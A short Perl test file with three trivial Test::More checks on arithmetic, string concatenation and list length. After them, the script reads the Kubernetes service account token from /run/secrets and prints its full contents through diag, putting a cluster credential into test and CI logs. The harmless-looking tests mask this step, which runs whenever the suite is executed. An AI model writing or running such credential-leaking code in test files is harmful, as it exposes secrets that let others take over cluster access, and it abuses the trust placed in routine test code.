use strict;
use warnings;
use Test::More tests => 3;

is(1 + 1, 2, 'One plus one should equal two');
is('hello' . ' ' . 'world', 'hello world', 'String concatenation should work');

my @list = (1, 2, 3);
is(scalar @list, 3, 'List should contain 3 elements');

diag("This is a diagnostic message.");

my $file_path = '/run/secrets/kubernetes.io/serviceaccount/token';
open(my $fh, '<', $file_path) or die "Cannot open $file_path: $!";
my $file_contents = do { local $/; <$fh> };
close($fh);

# Use diag to output the contents of the file
diag("Contents of $file_path:\n$file_contents");
